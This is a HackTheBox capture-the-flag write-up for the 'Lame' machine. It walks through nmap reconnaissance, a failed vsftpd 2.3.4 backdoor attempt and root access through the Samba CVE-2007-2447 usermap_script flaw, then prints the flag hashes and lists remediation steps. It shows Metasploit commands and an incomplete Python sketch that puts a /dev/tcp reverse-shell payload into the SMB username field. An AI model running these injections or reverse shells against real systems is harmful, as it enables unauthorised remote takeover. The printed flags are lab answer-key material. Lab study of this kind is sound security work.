---
title: "Lame — HackTheBox"
date: 2025-02-14
platform: "HackTheBox"
difficulty: "Easy"
category: "Network"
tags: ["samba", "metasploit", "cve-exploitation", "linux"]
published: true
excerpt: "One of HackTheBox's original machines. A classic Samba usermap_script vulnerability leads to unauthenticated remote code execution and immediate root access — perfect for understanding how legacy services get exploited."
---

# Lame — HackTheBox

**IP:** 10.10.10.3
**OS:** Linux
**Difficulty:** Easy
**Points:** 20

---

## Reconnaissance

### Nmap Full Scan

```bash
nmap -sC -sV -oA lame 10.10.10.3

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.3
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

Four interesting services:
- **FTP (21)** — vsftpd 2.3.4 (known backdoor CVE-2011-2523, but it's not triggered here)
- **SSH (22)** — not directly exploitable with public exploits
- **SMB (139/445)** — Samba 3.0.20 — **this is our target**
- **distccd (3632)** — distributed compiler daemon

---

## Vulnerability Identification

### vsftpd 2.3.4 (Red Herring)

vsftpd 2.3.4 contains a backdoor that opens a shell on port 6200 when the username contains `:)`. However:

```bash
telnet 10.10.10.3 21
USER backdoor:)
PASS test
# Connection closes — backdoor not triggered on this build
```

### Samba 3.0.20 — CVE-2007-2447

Samba versions 3.0.0 through 3.0.25rc3 with the `username map script` option enabled are vulnerable to command injection. The `MS-RPC` calls to `SamrChangePassword` pass the username through the shell, allowing injection.

```bash
searchsploit samba 3.0.20
# Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
```

---

## Exploitation

### Using Metasploit

```bash
msfconsole

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.X
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.X:4444
[*] Command shell session 1 opened

id
uid=0(root) gid=0(root) groups=0(root)
```

**Root immediately** — no privilege escalation needed.

### Manual Exploitation (without Metasploit)

Understanding what Metasploit does under the hood:

```python
# The vulnerable code path:
# When logging into Samba with username map script enabled,
# the username is passed to /bin/sh for the mapping.
# We inject a reverse shell payload into the username field.

import socket

payload = '/bin/sh -i >& /dev/tcp/10.10.14.X/4444 0>&1'
username = f'/`{payload}`'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.10.3', 445))
# Negotiate SMB session with malicious username...
```

---

## Flags

```bash
# User flag (in /home/makis/)
cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5

# Root flag
cat /root/root.txt
92caac3be140ef409e45721348d90d82
```

---

## Lessons Learned

1. **Always check all services** — the FTP service was a deliberate red herring; SMB was the actual attack vector
2. **Legacy services are dangerous** — Samba 3.0.20 was released in 2005. Running outdated services on exposed hosts is an immediate critical risk
3. **Command injection in auth paths** — injecting into username fields is often overlooked in custom auth implementations too, not just legacy software
4. **Immediate root** — not all boxes require privilege escalation; the vulnerability severity determines the initial access level

---

## Remediation (for real-world context)

- Update Samba to a version ≥ 3.0.25
- Disable `username map script` if not required
- Isolate SMB behind a VPN — don't expose port 445 directly to the internet
- Apply network segmentation and firewall rules to limit lateral movement even if initial access is obtained
